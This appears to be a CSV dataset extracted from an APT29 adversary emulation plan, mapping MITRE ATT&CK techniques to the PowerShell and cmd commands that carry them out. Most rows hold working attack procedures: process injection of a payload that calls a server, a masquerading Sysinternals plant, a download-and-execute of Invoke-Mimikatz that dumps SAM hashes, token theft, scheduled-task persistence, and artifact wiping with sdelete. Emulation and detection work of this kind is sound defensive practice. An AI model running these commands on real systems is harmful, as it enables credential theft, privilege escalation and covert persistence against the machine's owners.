+apt29,apt29,unknown,apt29::44,44,Abuse Elevation Control Mechanism: Bypass User Account Control,attack_id: T1548.002 | name: Abuse Elevation Control Mechanism: Bypass User Account Control,"[""T1548.002""]","[""T1548""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::45,45,Registry Cleanup for UAC Bypass Technique,"id: 5ff80022-8d85-410b-b868-6c7565b267e5 | name: Registry Cleanup for UAC Bypass Technique | description: Delete registry entries post-UAC bypass. | tactic: defensive-evasion | technique: attack_id: T1112 | name: Modify Registry | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 3.B | platforms: windows: psh,pwsh: command: Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+  write-host ""[+] Reg keys removed!"";
+ }
+ | executors: name: powershell | command: Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+  write-host ""[+] Reg keys removed!"";
+  }
+","[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::46,46,Modify Registry,attack_id: T1112 | name: Modify Registry,"[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::47,47,Process Injection,"id: 088b8639-3f37-42cc-9dc8-01aabb645461 | name: Process Injection | description: The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT. | tactic: privilege-escalation | technique: attack_id: T1055 | name: Process Injection | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.C | platforms: windows: psh,pwsh: command: Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Inject -PoshCode $pcode;
+ | payloads: update.ps1 | Invoke-PSInject.ps1 | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Inject -PoshCode $pcode;
+","[""T1055""]","[""T1055""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::48,48,Process Injection,attack_id: T1055 | name: Process Injection,"[""T1055""]","[""T1055""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::49,49,Planting Modified Sysinternals Utilities,"id: 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d | name: Planting Modified Sysinternals Utilities | description: Uploading payloads masquerading as via modified SysInternalsSuite | tactic: stage-capabilities | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: N/A | procedure_group: procedure_staging | procedure_step: 4.A.1 | platforms: windows: psh,pwsh: command: iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
+Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error moving files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
+Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error expanding files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
+if ($dir_exists -eq $true) {
+  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+} else {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+}
+
+if (test-path -path ""SysInternalsSuite.zip"") {
+  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
+  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if ($?) {
+  gci;
+  write-host ""[*] Successfully planted files""
+} else {
+  write-host ""[!] Error downloading and planting modified system tools.""
+}
+ | payloads: Modified-SysInternalsSuite.zip | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
+Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error moving files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
+Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error expanding files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
+if ($dir_exists -eq $true) {
+  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+} else {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+}
+
+if (test-path -path ""SysInternalsSuite.zip"") {
+  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
+  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if ($?) {
+  gci;
+  write-host ""[*] Successfully planted files""
+} else {
+  write-host ""[!] Error downloading and planting modified system tools.""
+}
+","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::50,50,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::51,51,Remote System Discovery,"id: 59592c35-8207-4896-8d8b-36ad4600245d | name: Remote System Discovery | description: The net utility is executed via cmd to enumerate DCs within the domain | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.A.2 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Controllers"" /domain
+ | executors: name: powershell | command: cmd.exe /c net group ""Domain Controllers"" /domain
+","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::52,52,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::53,53,Remote System Discovery,"id: 24ed020e-4730-4000-b6b4-6b5d3e95314f | name: Remote System Discovery | description: The net utility is executed via cmd to enumerate hosts within the domain. | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.A.3 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Computers"" /domain
+ | executors: name: powershell | command: cmd.exe /c net group ""Domain Computers"" /domain
+","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::54,54,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::55,55,System Network Configuration Discovery,"id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b | name: System Network Configuration Discovery | description: The netsh utility is executed via cmd to enumerate local firewall configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.B.1 | platforms: windows: cmd: command: netsh advfirewall show allprofiles
+ | executors: name: command_prompt | command: netsh advfirewall show allprofiles
+","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::56,56,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::57,57,Process Discovery,"id: 646be6c9-f27a-4f5f-be5d-b8a0317e215f | name: Process Discovery | description: List running process on the machine via PowerShell. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.B.2 | platforms: windows: psh,pwsh: command: $ps = get-process;
+write-output $ps;
+ | executors: name: powershell | command: $ps = get-process;
+write-output $ps;
+","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::58,58,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::59,59,Artifact Cleanup - Delete Files,"id: 9b5b5aec-32ff-4d74-8555-727b50ab15f6 | name: Artifact Cleanup - Delete Files | description: Cleanup files related to Operation | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 4.B.3 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+gci $env:userprofile\Desktop;
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
+.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+gci $env:userprofile\Desktop;
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
+.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";
+","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::60,60,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::61,61,Loading Stage-2 & Performing Discovery,"id: 6f1f4768-7099-45d2-a858-b49dc792234e | name: Loading Stage-2 & Performing Discovery | description: Load Stage-2 from Modified Sysinternals Toolset | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.C.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (!(test-path "".\readme.ps1"")) {
+  Move-Item .\readme.txt readme.ps1 -Force;
+}
+. .\readme.ps1;
+Invoke-Discovery;
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (!(test-path "".\readme.ps1"")) {
+  Move-Item .\readme.txt readme.ps1 -Force;
+}
+. .\readme.ps1;
+Invoke-Discovery;
+","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::62,62,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::63,63,4.C.2 - System Network Connections Discovery (T1049),"id: ba0b398d-91b8-490a-bed2-f959afa8e1aa | name: 4.C.2 - System Network Connections Discovery (T1049) | description: The netstat utility is executed via cmd to enumerate local active network connections. | tactic: discovery | technique: attack_id: T1049 | name: System Network Connections Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.C.2 | platforms: windows: cmd: command: netstat -ano
+ | executors: name: command_prompt | command: netstat -ano
+","[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::64,64,System Network Connections Discovery,attack_id: T1049 | name: System Network Connections Discovery,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::65,65,Credential Dumping using Process Injection,"id: effbedc1-1bc8-4a75-9395-980559700008 | name: Credential Dumping using Process Injection | description: Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS. | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 5.A.1 | platforms: windows: psh,pwsh: command: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
+iex $result;
+function hashdump
+{
+    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
+};
+hashdump;
+ | executors: name: powershell | command: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
+iex $result;
+function hashdump
+{
+    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
+};
+hashdump;
+","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::66,66,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::67,67,Persistent Service 1,"id: 9c75155e-21ab-4471-af16-45f3795a313c | name: Persistent Service 1 | description: Leverage modified Sysinternals | tactic: persistence | technique: attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_persistence | procedure_step: 5.A.2 | platforms: windows: psh,pwsh: command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
+  write-host ""[*] Service already exists...Not running persistence step-1"";
+  exit 1;
+}
+
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 1;
+  write-host ""[+] Persistence 1 invoked."";
+  exit 0;
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  exit 1;
+}
+ | executors: name: powershell | command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
+  write-host ""[*] Service already exists...Not running persistence step-1"";
+  exit 1;
+}
+
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 1;
+  write-host ""[+] Persistence 1 invoked."";
+  exit 0;
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  exit 1;
+}
+","[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::68,68,Boot or Logon Autostart Execution: Shortcut Modification,attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification,"[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::69,69,Persistent Service 2,"id: 45f18b58-c14f-4b61-a3da-41b67af21429 | name: Persistent Service 2 | description: Leverage modified Sysinternals | tactic: persistence | technique: attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_persistence | procedure_step: 5.B.1 | platforms: windows: psh,pwsh: command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 2;
+  write-host ""[+] Persistence 2 invoked."";
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  return 1;
+}
+ | executors: name: powershell | command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 2;
+  write-host ""[+] Persistence 2 invoked."";
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  return 1;
+}
+","[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::70,70,Boot or Logon Autostart Execution: Shortcut Modification,attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification,"[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::71,71,Access Token Manipulation,"id: 03afada1-1714-408f-bde5-f528b91dc89d | name: Access Token Manipulation | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134 | name: Access Token Manipulation | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 5.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+ | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.10 | server: description: IP or Hostname of server | type: string | default: 127.0.0.1 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+","[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::72,72,Access Token Manipulation,attack_id: T1134 | name: Access Token Manipulation,"[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::73,73,Credentials In Files- Chrome,"id: e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d | name: Credentials In Files- Chrome | description: Obtain credentials from Chrome Dumper | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 6.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+./accesschk.exe -accepteula .;
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+./accesschk.exe -accepteula .;
+","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::74,74,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::75,75,Query Registry,"id: 1b9e018d-986d-42d9-bb8b-0e104e98ce9c | name: Query Registry | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134 | name: Access Token Manipulation | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 6.A.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+ | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
